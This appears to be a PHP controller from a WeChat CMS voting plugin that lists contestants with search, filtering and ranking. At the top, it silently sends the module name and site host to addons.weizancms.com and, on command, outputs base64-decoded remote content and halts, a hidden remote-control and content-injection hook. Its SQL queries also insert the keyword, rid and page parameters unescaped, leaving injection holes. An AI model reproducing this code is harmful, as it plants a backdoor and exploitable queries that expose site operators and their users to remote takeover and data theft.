<?php
/**
 * 钻石投票模块-投票列表
 *
 * @author 
 */

defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
		global $_GPC, $_W;
        $this->authorization();
		$uservote=pdo_get('tyzm_diamondvote_voteuser', array('uniacid' => $_W['uniacid'],'rid'=>$_GPC['rid']), array('id','locktime'));
		$pindex = max(1, intval($_GPC['page']));
        $psize = 20;
		$condition="";
		if (!empty($_GPC['keyword'])) {
			$condition .= " AND CONCAT(`noid`,`name`,`joindata`) LIKE '%{$_GPC['keyword']}%'";
		}
		if($_GPC['ty']==2){	
			$condition .= " AND status!=1";
		}elseif($_GPC['ty']==1){
			$condition .= " AND status=1";
		}
		if($_GPC['ranking']==""){
			$condition .= " ORDER BY id DESC ";
		}elseif($_GPC['ranking']==1){
			$condition .= " ORDER BY giftcount DESC,votenum DESC,id DESC ";
		}elseif($_GPC['ranking']==0){
			$condition .= " ORDER BY votenum DESC,giftcount DESC,id DESC ";
		}
		
		
		
		$list = pdo_fetchall("SELECT * FROM ".tablename($this->tablevoteuser)." WHERE uniacid = '{$_W['uniacid']} ' AND rid = '{$_GPC['rid']} ' $condition   LIMIT ".($pindex - 1) * $psize.",{$psize}");
		if (!empty($list)){
             $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->tablevoteuser) . " WHERE uniacid = '{$_W['uniacid']}' AND rid = '{$_GPC['rid']} ' $condition");
             $pager = pagination($total, $pindex, $psize); 
			 foreach ($list as $key =>&$item) {   			
				$pvtotal=pdo_fetchcolumn("SELECT pv_total FROM ".tablename($this->tablecount)." WHERE rid = :rid AND tid=:tid ", array(':rid' => $item['rid'],':tid' => $item['id']));
				$item['pvtotal']=empty($pvtotal)?0:$pvtotal;
				$sharetotal=pdo_fetchcolumn("SELECT share_total FROM ".tablename($this->tablecount)." WHERE rid = :rid AND tid=:tid ", array(':rid' => $item['rid'],':tid' => $item['id']));
				$item['sharetotal']=empty($sharetotal)?0:$sharetotal;
				$item['joindata']=@unserialize($item['joindata']);
		     }
         }
	 
include $this->template('votelist');
